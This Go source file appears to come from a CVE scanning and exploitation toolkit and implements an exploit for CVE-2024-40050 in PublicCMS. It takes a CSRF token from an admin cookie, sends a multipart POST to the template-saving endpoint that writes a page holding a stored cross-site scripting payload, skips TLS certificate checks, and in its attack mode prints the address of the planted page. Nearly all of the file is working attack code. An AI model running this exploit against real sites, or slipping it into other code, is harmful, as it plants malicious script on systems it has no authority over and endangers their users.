package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"regexp"
	"strings"
	"time"
)

func CVE_2024_40050(url string, Attack bool) error {
	cookie := Cookie
	csrf := ""
	// 定义正则表达式模式
	pattern := `PUBLICCMS_ADMIN=1_([^;]+)`

	// 编译正则表达式
	regex := regexp.MustCompile(pattern)

	// 查找匹配项
	match := regex.FindStringSubmatch(cookie)

	if len(match) >= 2 {
		csrf = match[1]
	} else {
	}

	payload := `
-----------------------------163966804931607146212670675591
Content-Disposition: form-data; name="_csrf"

` + csrf + `
-----------------------------163966804931607146212670675591
Content-Disposition: form-data; name="path"

ycxlo.html
-----------------------------163966804931607146212670675591
-----------------------------163966804931607146212670675591
Content-Disposition: form-data; name="content"

<img src=1 onerror=alert(document.cookie)>
-----------------------------163966804931607146212670675591
Content-Disposition: form-data; name="encoding"

utf-8
-----------------------------163966804931607146212670675591
Content-Disposition: form-data; name="ajax"

1
-----------------------------163966804931607146212670675591--`

	payload = strings.ReplaceAll(payload, "\n", "\r\n") //我只能说nb，还得这么写

	// 创建自定义的 Transport(禁用SSL)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		//Proxy:           http.ProxyURL(proxyURL()), // 设置代理信息
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	url1 := fmt.Sprintf("%s/admin/cmsTemplate/savePlaceMetaData", url)
	//fmt.Println(url2)
	request, err := http.NewRequest("POST", url1, strings.NewReader(payload))
	if err != nil {
		return err
	}
	request.Header.Add("Content-Type", "multipart/form-data; boundary=---------------------------163966804931607146212670675591")
	request.Header.Add("Content-Length", fmt.Sprint(strings.NewReader(payload).Len()))
	request.Header.Add("Cookie", cookie)

	response, err := client.Do(request)
	if err != nil {
		return err
	}
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return err
	}

	if strings.Contains(string(body), "操作成功") {
		fmt.Println("[*]CVE-2024-40050 : " + url)
		if Attack {
			fmt.Println("Attack-Result : " + url + "/includeycxlo.html\n")
		}
	}

	defer response.Body.Close()

	return nil
}
